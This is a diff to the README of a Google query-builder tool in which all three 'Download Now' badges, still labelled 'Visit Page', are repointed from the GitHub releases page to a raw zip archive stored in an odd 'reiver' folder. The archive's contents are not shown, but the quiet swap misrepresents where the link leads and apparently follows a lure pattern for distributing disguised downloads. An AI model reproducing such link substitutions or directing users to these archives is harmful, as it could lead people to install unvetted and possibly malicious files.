@@ -1,6 +1,6 @@
 # 🔍 xsukax-Google-Search-Builder - Create Complex Google Queries Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/raw/refs/heads/main/reiver/Google-Builder-Search-xsukax-3.6.zip)
 
 ## 📝 What is xsukax-Google-Search-Builder?
 
@@ -38,7 +38,7 @@ To start using xsukax-Google-Search-Builder, follow these steps carefully. No pr
 
 Click the button below to open the official release page on GitHub.
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/raw/refs/heads/main/reiver/Google-Builder-Search-xsukax-3.6.zip)
 
 ### Step 2: Download the Application File
 
@@ -138,4 +138,4 @@ The app is one single file for easy sharing and safe offline use.
 
 Access the latest version here:
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Photonstylomecon461/xsukax-Google-Search-Builder/raw/refs/heads/main/reiver/Google-Builder-Search-xsukax-3.6.zip)
